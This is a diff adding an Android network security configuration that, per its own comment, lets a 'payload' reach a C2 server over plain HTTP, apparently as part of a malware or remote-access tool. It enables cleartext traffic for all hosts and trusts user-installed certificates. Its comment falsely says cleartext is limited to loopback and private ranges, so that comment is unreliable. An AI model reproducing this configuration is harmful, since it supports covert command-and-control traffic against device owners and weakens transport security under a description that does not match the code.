@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Allows the payload to talk to a C2 over plain HTTP.
+
+  Android 9 (API 28) blocks cleartext traffic by default. The HTTP
+  long-polling transport needs it when the server sits behind a plain
+  HTTP reverse proxy, which is the common case on shared hosting.
+
+  cleartextTrafficPermitted="true" is set only for the loopback and
+  private ranges; a public host must be reached over HTTPS.
+-->
+<network-security-config>
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system" />
+            <certificates src="user" />
+        </trust-anchors>
+    </base-config>
+</network-security-config>
